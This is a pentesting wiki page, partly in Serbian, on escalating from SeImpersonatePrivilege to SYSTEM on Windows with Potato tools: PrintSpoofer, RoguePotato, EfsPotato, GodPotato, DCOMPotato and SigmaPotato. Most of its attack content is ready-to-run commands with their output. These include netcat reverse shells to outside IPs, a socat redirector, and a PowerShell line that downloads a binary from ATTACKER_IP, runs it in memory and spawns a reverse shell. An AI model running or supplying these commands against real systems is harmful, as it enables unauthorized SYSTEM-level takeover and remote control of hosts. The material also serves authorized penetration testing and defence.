# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** na Windows Server 2019 i Windows 10 build 1809 i novijim verzijama. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu da se koriste za iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`. Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) ide detaljno u `PrintSpoofer` alat, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.

> [!TIP]
> Moderna alternativa koja se često održava u 2024–2025 je SigmaPotato (a fork of GodPotato) koja dodaje upotrebu in-memory/.NET reflection i proširenu podršku za OS. Pogledajte brz primer upotrebe ispod i repo u References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Zahtevi i česte zamke

Sve sledeće tehnike oslanjaju se na zloupotrebu privilegisanog servisa koji podržava impersonation iz konteksta koji poseduje jednu od sledećih privilegija:

- SeImpersonatePrivilege (najčešće) ili SeAssignPrimaryTokenPrivilege
- High integrity nije potreban ako token već ima SeImpersonatePrivilege (tipično za mnoge service naloge kao što su IIS AppPool, MSSQL, itd.)

Brzo proverite privilegije:
```cmd
whoami /priv | findstr /i impersonate
```
Operativne napomene:

- Ako vaš shell radi pod ograničenim tokenom koji nema SeImpersonatePrivilege (češće kod Local Service/Network Service u nekim scenarijima), vratite podrazumevane privilegije naloga pomoću FullPowers, a zatim pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer zahteva da je Print Spooler servis pokrenut i dostupan preko lokalne RPC krajnje tačke (spoolss). U zategnutim okruženjima gde je Spooler onemogućen nakon PrintNightmare, preferirajte RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato zahteva OXID resolver dostupan preko TCP/135. Ako je egress blokiran, koristite redirector/port-forwarder (vidi primer dole). Starije verzije su zahtevale -f flag.
- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedan pipe blokiran, pokušajte alternativne pipe (lsarpc, efsrpc, samr, lsass, netlogon).
- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznatu ili nepodržanu RPC autentikacionu uslugu; pokušajte drugi pipe/transport ili proverite da li ciljna usluga radi.

## Brzi demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Napomene:
- Možete koristiti -i da pokrenete interaktivni proces u trenutnoj konzoli, ili -c da izvršite one-liner.
- Zahteva Spooler service. Ako je onemogućen, ovo neće uspeti.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ako je izlazni port 135 blokiran, pivot OXID resolver preko socat na vašem redirectoru:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato je novija COM abuse primitive objavljena krajem 2022. koja cilja servis **PrintNotify** umesto Spooler/BITS. Izvršna datoteka instancira PrintNotify COM server, ubacuje lažni `IUnknown`, a zatim pokreće privilegovani callback preko `CreatePointerMoniker`. Kada se servis PrintNotify (koji radi kao **SYSTEM**) poveže nazad, proces duplira vraćeni token i pokreće prosleđeni payload sa punim privilegijama.

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.

Operatori kao što je Ink Dragon pokreću PrintNotifyPotato odmah nakon sticanja ViewState RCE na SharePoint-u kako bi pivotovali sa `w3wp.exe` workera na **SYSTEM** pre instalacije ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Savjet: Ako jedan pipe zakaže ili ga EDR blokira, pokušajte ostale podržane pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Napomene:
- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutan SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato nudi dve varijante koje ciljaju DCOM service objekte koji podrazumevano koriste RPC_C_IMP_LEVEL_IMPERSONATE. Kompajlirajte ili koristite priložene binaries i pokrenite svoju komandu:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ažurirani GodPotato fork)

SigmaPotato dodaje moderne pogodnosti kao što su in-memory execution putem .NET reflection i PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Izvori

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Vraćanje podrazumevanih privilegija tokena za servisne naloge](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Otkrivanje mreže releja i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
